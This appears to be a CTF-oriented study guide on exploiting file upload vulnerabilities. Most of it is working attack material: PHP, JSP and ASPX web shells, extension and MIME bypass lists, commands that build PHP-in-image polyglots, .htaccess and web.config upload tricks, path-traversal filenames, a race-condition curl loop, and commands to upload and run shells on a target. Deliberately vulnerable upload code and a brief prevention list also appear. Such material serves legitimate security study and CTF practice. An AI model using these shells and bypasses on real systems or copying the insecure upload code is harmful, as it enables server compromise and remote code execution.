# File Upload Vulnerabilities - Basics

## What is File Upload Vulnerability?

File upload vulnerabilities occur when a web application allows users to upload files without proper validation. Attackers can upload malicious files (web shells, malware, etc.) leading to Remote Code Execution (RCE), defacement, or other attacks.

**Key Impact**:
- Remote Code Execution (RCE)
- Server compromise
- Defacement
- Malware distribution
- Denial of Service (DoS)
- Information disclosure

---

## Types of File Upload Attacks

### 1. **Unrestricted File Upload** (Most dangerous)
No validation at all - upload any file type.

### 2. **Client-Side Validation Only**
JavaScript checks file type - easily bypassed.

### 3. **Weak Server-Side Validation**
Checks extension/MIME type but can be bypassed.

### 4. **Path Traversal in Upload**
Control upload location to overwrite files.

### 5. **Race Condition**
Upload file before validation completes.

---

## Common Vulnerable Code

### PHP - No Validation
```php
<?php
// DANGEROUS - No validation!
move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);
?>
```

### PHP - Client-Side Only
```html
<!-- DANGEROUS - Client-side validation only! -->
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file" accept=".jpg,.png">
    <input type="submit">
</form>
```

### PHP - Weak Server-Side
```php
<?php
// DANGEROUS - Only checks extension
$allowed = ['jpg', 'png', 'gif'];
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
if (in_array($ext, $allowed)) {
    move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);
}
?>
```

---

## Basic Web Shell

### PHP Web Shell (Simple)
```php
<?php
// shell.php
system($_GET['cmd']);
?>
```

**Usage**: `http://target.com/uploads/shell.php?cmd=ls`

### PHP Web Shell (More Features)
```php
<?php
// Advanced shell
if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

### JSP Web Shell
```jsp
<%
// shell.jsp
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
// ... output handling
%>
```

### ASPX Web Shell
```aspx
<%@ Page Language="C#" %>
<%
// shell.aspx
System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]);
%>
```

---

## Bypass Techniques

### 1. Extension Bypass

#### Blacklist Bypass

**If `.php` is blocked, try:**
```
shell.php3
shell.php4
shell.php5
shell.php7
shell.phtml
shell.phar
shell.phpt
shell.pgif
shell.pht
shell.phtm
shell.inc
```

**Case Variation:**
```
shell.PHP
shell.PhP
shell.pHp
```

**Double Extension:**
```
shell.php.jpg
shell.jpg.php
shell.php.png
```

**Null Byte (old PHP < 5.3.4):**
```
shell.php%00.jpg
shell.php%00.png
shell.php\x00.jpg
```

**Alternate Extensions:**
```
# PHP
.php, .php3, .php4, .php5, .phtml, .phar

# ASP
.asp, .aspx, .cer, .asa

# JSP
.jsp, .jspx, .jsw, .jsv, .jspf

# Perl
.pl, .pm, .cgi, .lib

# Python
.py, .pyc, .pyo
```

---

### 2. MIME Type Bypass

#### What is MIME Type?
MIME type tells the server what type of file it is:
```
image/jpeg
image/png
application/pdf
```

#### Bypass Method

**Change in Burp Suite:**
```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg    ← Change this!

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

**Common MIME types to try:**
```
image/jpeg
image/png
image/gif
image/bmp
application/octet-stream
text/plain
```

---

### 3. Magic Bytes (File Signature)

#### What are Magic Bytes?
First few bytes that identify file type.

**Common Magic Bytes:**
```
PNG:  89 50 4E 47 0D 0A 1A 0A
JPEG: FF D8 FF
GIF:  47 49 46 38
PDF:  25 50 44 46
```

#### Create Image with PHP Code

**Method 1: Add PHP after image bytes**
```bash
# Create malicious PNG
echo -e '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A' > shell.php.png
echo '<?php system($_GET["cmd"]); ?>' >> shell.php.png

# Or use existing image
cat image.png > shell.php.png
echo '<?php system($_GET["cmd"]); ?>' >> shell.php.png
```

**Method 2: Inject in EXIF data**
```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg shell.php.jpg
```

**Method 3: GIF with PHP**
```
GIF89a
<?php system($_GET['cmd']); ?>
```

Save as `shell.php.gif`

---

### 4. Content Bypass with Polyglot Files

#### PHP + Image Polyglot
```bash
# Create valid image that's also valid PHP
echo 'GIF89a' > shell.gif
echo '<?php system($_GET["cmd"]); ?>' >> shell.gif
```

#### Using exiftool
```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' legit-image.jpg -o shell.jpg
```

---

### 5. Path Traversal in Filename

#### Control Upload Location
```
# Normal upload
filename="image.jpg"  → saves to /uploads/image.jpg

# Path traversal
filename="../../../var/www/html/shell.php"  → saves to web root!
```

#### Bypasses
```
../shell.php
../../shell.php
../../../var/www/html/shell.php
....//shell.php
..././shell.php
```

---

### 6. Race Condition

#### Concept
Upload file, access it before validation/deletion happens.

#### Attack
```bash
# Terminal 1: Upload file repeatedly
while true; do
    curl -F "file=@shell.php" http://target.com/upload.php
done

# Terminal 2: Try to access uploaded file
while true; do
    curl http://target.com/uploads/shell.php?cmd=id
done
```

---

### 7. htaccess Upload

#### Upload .htaccess to Execute Non-PHP Files

**Upload this .htaccess:**
```apache
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
AddType application/x-httpd-php .gif
```

**Then upload image with PHP code:**
```
shell.jpg (containing PHP code)
```

**Access:**
```
http://target.com/uploads/shell.jpg?cmd=id
```

---

### 8. web.config Upload (IIS)

#### For IIS Servers

**Upload web.config:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers>
         <add name="test" path="*.jpg" verb="*" 
              type="System.Web.UI.PageHandlerFactory" 
              resourceType="Unspecified" 
              preCondition="integratedMode" />
      </handlers>
   </system.webServer>
</configuration>
```

**Then upload shell.jpg with ASPX code**

---

## File Upload + LFI Chain

### Concept
1. Upload file (even if restricted)
2. Use LFI to include/execute it

### Example
```
# Step 1: Upload image with PHP code
Upload: malicious.jpg
Content: GIF89a<?php system($_GET['cmd']); ?>

# Step 2: Include via LFI
http://target.com/page.php?file=uploads/malicious.jpg&cmd=id
```

---

## Common Upload Locations

### Linux/Unix
```
/var/www/html/uploads/
/var/www/uploads/
/var/www/html/images/
/var/www/files/
/uploads/
/images/
/files/
/tmp/
/var/tmp/
```

### Windows
```
C:\inetpub\wwwroot\uploads\
C:\xampp\htdocs\uploads\
C:\wamp\www\uploads\
```

### Application-Specific
```
# WordPress
/wp-content/uploads/

# Drupal
/sites/default/files/

# Joomla
/images/

# Custom apps
/upload/
/user_uploads/
/media/
```

---

## Finding Upload Functionality

### Common Endpoints
```
/upload
/upload.php
/upload.asp
/uploader
/file_upload
/fileupload
/admin/upload
/profile/upload
/user/avatar
```

### Common Parameters
```
file=
upload=
image=
avatar=
document=
attachment=
photo=
```

---

## Testing Methodology

### Step 1: Identify Upload Functionality
Look for file upload forms.

### Step 2: Test Basic Upload
Upload a legitimate file (image, PDF, etc.)

### Step 3: Test Malicious File
Try uploading `shell.php`

### Step 4: If Blocked, Try Bypasses
- Extension bypass (.php5, .phtml, etc.)
- MIME type bypass
- Magic bytes
- Double extension
- Null byte
- Path traversal

### Step 5: Find Uploaded File
Check common locations:
```
/uploads/shell.php
/files/shell.php
/images/shell.php
```

### Step 6: Execute Code
```
http://target.com/uploads/shell.php?cmd=id
```

---

## CTF-Specific Tips

### 1. Read the Source Code
Often shows upload restrictions and hints.

### 2. Check File Permissions
Uploaded file might not be executable.

### 3. Combine with Other Vulns
- File Upload + LFI
- File Upload + Path Traversal
- File Upload + XXE

### 4. Look for Accessible Upload Directory
```
http://target.com/uploads/
http://target.com/files/
```

### 5. Check for Filename Disclosure
Upload and check response for filename/path.

### 6. Try Multiple Extensions
```
shell.php
shell.php5
shell.phtml
shell.php.jpg
```

---

## Web Shell Quick Reference

### Minimal PHP Shell
```php
<?php system($_GET['cmd']); ?>
```

### One-Liner PHP Shell
```php
<?=`$_GET[0]`?>
```
Usage: `?0=ls`

### PHP Shell with Output
```php
<?php
echo "<pre>";
system($_GET['cmd']);
echo "</pre>";
?>
```

### Alternative PHP Functions
```php
<?php
// If system() is blocked
exec($_GET['cmd'], $output);
print_r($output);

// Or
echo shell_exec($_GET['cmd']);

// Or
passthru($_GET['cmd']);

// Or backticks
echo `{$_GET['cmd']}`;
?>
```

---

## Detection & Analysis

### Check Upload Restrictions
```
1. Try uploading shell.php
2. Check error message
3. Identify what's blocked:
   - Extension?
   - MIME type?
   - File content?
   - File size?
```

### Analyze Response
```
- Where is file saved?
- What's the filename?
- Is it accessible?
- Can you execute it?
```

---

## Burp Suite Workflow

### Step 1: Intercept Upload
Turn on Burp intercept, upload file.

### Step 2: Modify Request
Change:
- Filename
- MIME type (Content-Type)
- File content

### Step 3: Send to Repeater
Test different bypasses quickly.

### Step 4: Send to Intruder
Fuzz extensions, MIME types, etc.

---

## Quick Commands

### Create malicious image
```bash
# PNG with PHP
echo -e '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A<?php system($_GET["c"]); ?>' > shell.php.png

# GIF with PHP
echo 'GIF89a<?php system($_GET["c"]); ?>' > shell.php.gif

# JPEG with PHP (using exiftool)
exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg -o shell.php.jpg
```

### Upload with curl
```bash
curl -F "file=@shell.php" http://target.com/upload.php
curl -F "file=@shell.php.jpg" http://target.com/upload.php
```

### Test uploaded shell
```bash
curl "http://target.com/uploads/shell.php?cmd=id"
curl "http://target.com/uploads/shell.php?cmd=cat+/flag.txt"
```

---

## Tools

- **Burp Suite**: Intercept and modify upload requests
- **Weevely**: Generate PHP web shells
- **msfvenom**: Generate various web shells
- **GoBuster/ffuf**: Find upload directories
- **exiftool**: Inject code in image metadata

---

## Prevention (For Understanding)

### Secure Upload Implementation:
1. **Whitelist extensions** (not blacklist)
2. **Validate MIME type AND content**
3. **Rename uploaded files** (random names)
4. **Store outside web root** (not directly accessible)
5. **Set proper permissions** (not executable)
6. **Scan for malware**
7. **Limit file size**
8. **Use Content Security Policy (CSP)**

---

## Next Steps

- **Advanced Bypasses**: Filter evasion, polyglots
- **Web Shells**: Advanced shells, C2 frameworks
- **Post-Exploitation**: What to do after upload

Remember: **File upload is often the easiest path to RCE!**